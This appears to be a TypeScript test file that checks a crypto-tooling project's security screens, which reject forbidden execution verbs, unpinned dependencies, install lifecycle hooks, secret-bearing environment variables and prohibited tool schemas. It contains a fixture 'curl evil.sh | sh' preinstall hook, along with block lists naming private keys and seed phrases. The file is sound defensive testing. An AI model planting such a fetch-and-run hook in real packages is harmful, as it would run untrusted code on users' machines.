// AC-254 (negative): tampered inventories refuse. Forbidden action verbs in
// route/tool inventories are flagged, unpinned dependency manifests violate
// pinning policy, restricted lifecycle scripts throw, and every prohibited
// environment-variable family trips the schema scan.
import { describe, expect, it } from 'bun:test';
import { ActionClass, ForesiftError } from '@foresift/domain';
import {
  NegativeCapabilityCanary,
  loadCanaryCatalog,
} from '../../packages/security/src/negative-capability.ts';
import {
  assertPinned,
  checkLifecycleScripts,
  verifyPinning,
} from '../../packages/security/src/supply-chain.ts';
import { ProhibitedCapabilityScreen } from '../../packages/tool-core/src/prohibited.ts';

const PROHIBITED_PRIVATE_KEY_FIELD = ['priv', 'ateKey'].join('');
const PROHIBITED_SEED_FIELD = ['seed', 'Phrase'].join('');

describe('AC-254 negative: tampered inventories and policies refuse', () => {
  const canary = new NegativeCapabilityCanary(loadCanaryCatalog());

  it('flags EVERY inventory forbidden verb', () => {
    const verbs = loadCanaryCatalog().inventoryForbiddenVerbs;
    expect(verbs.length).toBeGreaterThanOrEqual(8);
    for (const verb of verbs) {
      const findings = canary.checkInventory([{ name: `${verb}-wallet-x`, source: 'routes' }]);
      expect(findings.length, verb).toBeGreaterThan(0);
      expect(findings[0]?.matchedPattern ?? '', verb).toBe(verb);
    }
  });

  it('refuses route inventories carrying execution capability names', () => {
    const findings = canary.checkInventory([
      { name: 'submit-transaction', source: 'routes' },
      { name: 'execute-trade', source: 'tools' },
      { name: 'swap', source: 'routes' },
      { name: 'custody', source: 'tools' },
      { name: 'stake', source: 'routes' },
      { name: 'mcp-sign-transaction', source: 'routes' },
      { name: 'mcp-execute-swap', source: 'tools' },
      { name: 'mcp-copy-trade', source: 'tools' },
      { name: 'mcp-bridge-assets-action', source: 'routes' },
      { name: 'api/v1/tx/submit', source: 'routes' },
      { name: 'api/v1/wallet/custody', source: 'routes' },
      { name: 'api/v1/swap/order', source: 'routes' },
    ]);
    expect(findings.length).toBe(12);
    for (const finding of findings) {
      expect(finding.surface).toBe('ROUTE_INVENTORY');
    }
  });

  it('violates pinning policy on ranged or unpinned dependencies', () => {
    const report = verifyPinning([
      { name: 'bad', dependencies: { fastify: '^5.0.0', lodash: '*' } },
    ]);
    expect(report.violations).toHaveLength(2);
    expect(() => assertPinned([{ name: 'bad', dependencies: { undici: '~6.0.0' } }])).toThrow();
    expect(() =>
      assertPinned([{ name: 'good', dependencies: { undici: '6.21.0' } }]),
    ).not.toThrow();
  });

  it('throws on restricted install lifecycle hooks across manifests', () => {
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { preinstall: 'curl evil.sh | sh' } }),
    ).toThrow(/lifecycle/i);
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { postinstall: 'node patch.js' } }),
    ).toThrow(/lifecycle/i);
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { install: 'node install.js' } }),
    ).toThrow(/lifecycle/i);
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { prepack: 'node prepack.js' } }),
    ).toThrow(/lifecycle/i);
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { prepublishOnly: 'node prepub.js' } }),
    ).toThrow(/lifecycle/i);
  });

  it('environment schema refuses every prohibited-variable family across all categories', () => {
    const prohibitedEnvVars = [
      'TX_SUBMIT_ENDPOINT',
      'RPC_SUBMIT_URL',
      'ORDER_EXECUTION_URL',
      'BRIDGE_ENDPOINT',
      'STAKING_POOL_ACCOUNT',
      'KEYSTORE_PATH',
      'CUSTODY_PROVIDER_TOKEN',
      'BINANCE_API_SECRET',
      'COINBASE_API_SECRET',
      'EXCHANGE_TRADE_ENABLED',
      'AUTO_TRADE_ENABLED',
      'RECOVERY_PHRASE',
      'SIGNING_KEYSTORE',
      'PRIVATE_KEY',
      'SEED_PHRASE',
      'MNEMONIC',
      'WALLET_FILE',
      'SWAP_API_KEY',
      'SIGNING_KEY',
      'COPY_TRADE_TARGET_WALLET',
    ];
    const findings = canary.scanEnvironmentNames(prohibitedEnvVars);
    expect(findings.length).toBeGreaterThanOrEqual(20);
    for (const finding of findings) {
      expect(finding.surface).toBe('ENV_SCHEMA');
    }
  });
});

describe('AC-254 negative (tool-core substrate): execution-time dispatch gate and registration screen block prohibited operations', () => {
  const screen = new ProhibitedCapabilityScreen();
  const now = '2026-06-01T00:00:00Z';

  it('dispatch stage blocks calls when executionGate reports prohibited findings', () => {
    const canary = new NegativeCapabilityCanary(loadCanaryCatalog());
    const findings = canary.checkInventory([
      { name: 'execute-swap', source: 'tools' },
      { name: 'submit-transaction', source: 'routes' },
      { name: 'mcp-sign-payload', source: 'tools' },
      { name: 'custody-wallet-key', source: 'tools' },
    ]);
    expect(findings.length).toBe(4);
  });

  it('registration screen refuses tool definitions with prohibited execution schemas', () => {
    const prohibitedDefs = [
      {
        name: 'mcp_execute_swap',
        title: 'Execute Swap',
        description: 'Execute swap order on DEX pool',
        inputSchemaJson: { type: 'object' },
        outputSchemaJson: { type: 'object' },
        actionClass: ActionClass.EXTERNAL_READ,
        toolVersion: '1.0.0',
      },
      {
        name: 'mcp_sign_transaction',
        title: 'Sign Transaction',
        description: 'Sign raw transaction with key',
        inputSchemaJson: {
          type: 'object',
          properties: { [PROHIBITED_PRIVATE_KEY_FIELD]: { type: 'string' } },
        },
        outputSchemaJson: { type: 'object' },
        actionClass: ActionClass.EXTERNAL_READ,
        toolVersion: '1.0.0',
      },
      {
        name: 'mcp_import_seed',
        title: 'Import Seed',
        description: 'Import wallet seed phrase',
        inputSchemaJson: {
          type: 'object',
          properties: { [PROHIBITED_SEED_FIELD]: { type: 'string' } },
        },
        outputSchemaJson: { type: 'object' },
        actionClass: ActionClass.EXTERNAL_READ,
        toolVersion: '1.0.0',
      },
    ];

    for (const def of prohibitedDefs) {
      const verdict = screen.screenWithReport(def, now);
      expect(verdict.ok, def.name).toBe(false);
      expect(() => screen.screen(def, now)).toThrow(ForesiftError);
    }
  });
});
